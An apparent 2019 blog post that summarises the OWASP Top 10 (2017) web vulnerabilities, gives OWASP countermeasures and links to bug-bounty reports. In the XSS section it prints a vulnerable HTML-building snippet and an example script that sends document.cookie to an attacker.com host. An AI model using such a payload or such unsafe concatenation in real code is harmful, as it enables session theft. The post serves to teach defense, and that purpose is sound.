---
Title: "OWASP TOP 10(2017)"
Date: 2019-09-21T17:21:11+11:00
Summary: <OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks> summarizes the ten most likely, common, and dangerous vulnerabilities in web applications. Although it has been two years since the report was released, it is still very meaningful for introducing web security. Especially for engineers who are new to web security, this report is a very good guide that can help IT companies and development teams standardize the application development process and testing process, and improve the security of web products. This article will classify and analyze these vulnerability types and provide some of my personal opinions. 
draft: false
---


[OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf) summarizes the ten most likely, common, and dangerous vulnerabilities in web applications. Although it has been two years since the report was released, it is still very meaningful for introducing web security. Especially for engineers who are new to web security, this report is a very good guide that can help IT companies and development teams standardize the application development process and testing process, and improve the security of web products. This article will classify and analyze these vulnerability types and provide some of my personal opinions. 

## Category 1: No User Input Validation

### A1: Injection

In web security, injection is the most common and often the most impactful vulnerability. This includes SQL, NoSQL, OS, and LDAP injection, among others. These vulnerabilities are generally caused by a lack of validation of user input, with database injection being the most common. As a web application, many third-party services (such as databases, caches, system calls, etc.) are relied upon to implement specific functionality. When calling these services in web applications, commands are often sent to these services. If user input is not validated, it is easy for users to modify these commands and achieve the goal of calling other unintended commands.

**Related Cases**

[RCE with Flask Jinja Template Injection](https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870)
[H1-4420: From Quiz to Admin - Chaining Two 0-Days to Compromise An Uber Wordpress](https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/)

### A4: XML External Entity Injection (XXE)

This vulnerability primarily occurs during parsing of XML. These vulnerabilities typically appear in some web services that support SOAP, where the server needs to analyze requests in XML format. The OWASP recommends the following countermeasures for this vulnerability:

Use simple JSON requests whenever possible.
Use secure XML parsers and upgrade SOAP to SOAP1.2 or higher.
Validate requests (e.g., using whitelisting).

**Related cases**

[OOB XXE in PrizmDoc (CVE-2018–15805)](https://medium.com/@mrnikhilsri/oob-xxe-in-prizmdoc-cve-2018-15805-dfb1e474345c)

### A7: Cross-site scripting (XSS)

Unlike A1's backend service injection, XSS is an injection into the client-side web page, with the main target being the client-side. Common types of XSS injection include:

1. Stored XSS (injecting code that is saved to the database).
2. Reflected XSS (injecting code that is not saved to the backend, but is directly displayed on the webpage).
   ```js=
   (String)page += "<input name='creditcard' type='TEXT' value='" 
   + request.getParameter("CC") + "'>";
   // Attackers can inject code by modifying the 'CC' parameter in the browser, 
   // in order to steal cookies
   <script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?
   foo='+docuement.cookie</script>'
   ```
3. DOM-based XSS (usually occurs in single-page applications where user-controlled data is injected).

OWASP's recommended responses to this type of vulnerability include:
1. Use the XSS protection provided by the framework and understand the framework's XSS protection measures.
2. Validate user-controlled data and remove dangerous symbols.
3. Use CSP.

**Related Cases**

- [Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains](https://hackerone.com/reports/256152)
- [Reflected XSS POST method at partners.uber.com](https://hackerone.com/reports/129582)
- [How a classical XSS can lead to persistent ATO Vulnerability?](https://hackademic.co.in/how-a-classical-xss-can-lead-to-persistent-ato-vulnerability/)

### A8: Insecure Deserialization Vulnerability

This type of vulnerability is similar to XXE (XML External Entity) attacks. Deserialization is a process of converting data from a string to an object in memory. It involves parsing and constructing objects in memory, almost like a simplified interpreter interpreting code. As you can imagine, many problems can occur during this process. The following are the recommended countermeasures for this vulnerability according to OWASP:

1. Avoid accepting serialized objects from external sources or only accept serialized objects of primitive data types.
2. If the above is not possible, consider the following methods:
    - Use digital signatures for integrity checking.
    - Perform strict type checking after deserialization.
    - Isolate the deserialization process and run it in a low-privileged environment.
    - Record deserialization exceptions.
    - Limit and record the containers or servers that transmit deserialization.
    - Monitor deserialization and alert users who frequently call deserialization.

**Related Cases**

- [RCE and Complete Server Takeover of http://www.***.starbucks.com.sg/](https://hackerone.com/reports/502758)
- [Lack of payment type validation in dial.uber.com allows for free rides](https://hackerone.com/reports/162199)

## Category 2: The cost of obtaining illegal information/function is too low

### A2: Invalid Identity Authentication and Session Management

Identity authentication is a very important and basic function in web services. However, it is not as easy to do well as one might think. Even Instagram recently had vulnerabilities in authentication. According to OWASP, common vulnerabilities in identity authentication include:

1. Allowing attackers to automatically log in to a large number of accounts for testing
2. Allowing attackers to automatically exhaustively test a single account's login credentials
3. Exposing session IDs in URLs
4. Session IDs not being changed or invalidated

These vulnerabilities all have a common characteristic: the threshold for information leakage is too low. In other words, attackers can obtain corresponding user (login) information at relatively low cost. Common defense measures include:

1. Using multi-factor authentication (MFA) as much as possible
2. Not using simple initial passwords, especially for admin accounts
3. Not allowing users to create simple passwords to improve security
4. Increasing the cost for attackers to brute-force user accounts (such as adding CAPTCHAs, adding features to wait after failed logins)
5. Regularly changing session IDs

It's not just a problem with login credential guessing, but also with CAPTCHA guessing. In short, any function related to verification should have measures to prevent exhaustive attacks.

### A3: Sensitive information leakage

This type of vulnerability is mainly related to information storage and transmission. According to OWASP, vulnerabilities can occur when sensitive data (such as passwords) stored in a database is not encrypted, or is encrypted with weak encryption algorithms, especially when transmitted without HTTPS encryption.

Here, I would like to add an example I saw elsewhere. Website A is a stock announcement publishing website, and all announcements of listed trading companies must be published through this website on a regular basis. Mr. A is responsible for reviewing and publishing the company announcements. Because there are too many announcements to be published every day, Mr. A is accustomed to saving the announcements on the website first (at this point, the links have been generated but are not public), and then updating the link of the article on the website page at the scheduled time, so that everyone can access the announcement according to the public link. Mr. B is a stock trader who found that the links to the announcements were structured and that the links were accessible even before they were made public. So he wrote a script to download the announcements that had already generated links but had not yet been made public. This way, he could gain a huge information advantage by getting the latest stock information before the market, thereby gaining an edge.

**Related case**
- [Client secret, server tokens for developer applications returned by internal API](https://hackerone.com/reports/419655)

### A5: Lack of Function Level Access Control

According to OWASP, incorrect access control by users is a common vulnerability. Since there is a lack of automated permission testing, manual testing is often necessary. OWASP recommends that all permission verification and access control must be done on the backend and that user input must be strictly validated.

**Related cases**
- [Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)](https://hackerone.com/reports/143717)
- [Shopify Admin -- Permission from Settings to Customer](https://hackerone.com/reports/541606)

### A6: Configuration Error

With the development of the web, various new technologies and tools have emerged like bamboo shoots after a spring rain. Many of these tools involve a lot of configuration, especially some default configurations, which can easily cause vulnerabilities if not configured properly. According to OWASP, there are generally several types of configuration errors:
1. Failure to secure the tool's configuration
2. Failure to disable default accounts and passwords
3. Enabling unnecessary functionality
4. Returning error handling information to attackers
5. Using outdated and vulnerable software

Programmers should have a basic understanding of the tools and technologies they use, especially the security configurations of the corresponding tools and the possible problems that may arise.

**Related cases**

- [Nginx misconfiguration leading to direct PHP source code download](https://hackerone.com/reports/268382)
- [Chained Bugs to Leak Victim's Uber's FB Oauth Token](https://hackerone.com/reports/202781)
- [Open Redirect on central.uber.com allows for account takeover](https://hackerone.com/reports/206591)

## Category Three:

### A9: Use components with known vulnerabilities

This type of vulnerability is very common. Basically, when a component is found to have a vulnerability (0day), there is usually a period of time during which administrators need to patch it. In the past, many patches were applied manually, but now automation is generally required to reduce the attack window. If a vulnerability has been published for a long time, and even an exploit has been released, but the website has not been patched or the component has not been replaced, then the vulnerability will inevitably be exploited sooner or later. Take the bludkeep vulnerability as an example. This vulnerability was disclosed in March 2019, and just a few days ago an exploit that can cause code execution was released (https://github.com/rapid7/metasploit-framework/pull/12283). However, we can see from Shodan that there are still 200,000 servers in China alone that have not been patched.

![](https://i.imgur.com/myZOqmL.png)

This type of vulnerability is often exploited by malware and spreads quickly. Malware that mines cryptocurrency or carries out DDoS attacks, for example, loves this type of vulnerability. I previously wrote an analysis of malware that carries out DDoS attacks, which may be of interest to some.

### A10: Insufficient logging and monitoring of vulnerabilities

At first glance, this may not seem related to vulnerabilities, because the lack of logging and monitoring does not directly lead to website breaches. However, upon closer inspection, the lack of monitoring and logging is indeed a significant security issue. Many attacks are stopped in a timely manner precisely because of monitoring and logging. Without monitoring, if a website is breached, it may go unnoticed, and hackers may even be able to stay on a company's network for several months without being detected. With monitoring and logging, even if a website has vulnerabilities that are exploited by hackers, the breach can be discovered as quickly as possible, and the losses can be minimized. 

When it comes to logging and monitoring, there is also a special type of defense mechanism called a honeypot. Simply put, a vulnerable public server is deployed and observed through logging and monitoring to see how hackers penetrate and attack. By observing hackers' attack methods, better defense can be achieved.

## Summary

I think there are some measures that can be taken to mitigate these security issues.

1. Identify and collect possible attack points (attack surface)
2. Identify the functions of the website and the corresponding resources needed
3. Consider the technology involved behind the attack surface (such as whether it requires querying a database, etc.)
4. Consider the possible implementation paths behind the attack surface (including exception handling paths).

